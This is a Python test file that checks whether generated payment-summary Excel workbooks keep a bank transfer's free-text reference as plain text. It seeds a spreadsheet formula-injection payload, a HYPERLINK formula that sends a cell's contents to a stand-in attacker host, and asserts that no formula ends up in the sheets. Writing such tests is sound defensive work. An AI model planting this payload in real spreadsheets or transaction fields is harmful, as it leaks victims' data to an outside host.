"""The p4x summary workbooks never turn a booking's payment reference into a
formula, no matter what a bank transfer's free-text reference field says."""

import io
import zipfile
from datetime import date

from app.models.p4x_transaction import P4xTransaction
from app.services.p4x_summary_service import generate_summary_xlsx
from tests.p4x.test_p4x_summary import _seed

FORMULA = '=HYPERLINK("http://evil.example/?x="&C2,"Beleg")'


class TestSummaryWorkbookHasNoFormulas:
    def test_payment_reference_stays_text(self, db_session):
        _seed(db_session)
        tx = (
            db_session.query(P4xTransaction).filter_by(sha256_hash="summary_tx_1").one()
        )
        tx.subject = FORMULA
        db_session.commit()

        raw, _attachments = generate_summary_xlsx(
            db_session, date(2026, 3, 1), date(2026, 3, 31)
        )

        with zipfile.ZipFile(io.BytesIO(raw)) as archive:
            sheets = [n for n in archive.namelist() if n.startswith("xl/worksheets/")]
            assert all(b"<f>" not in archive.read(n) for n in sheets)
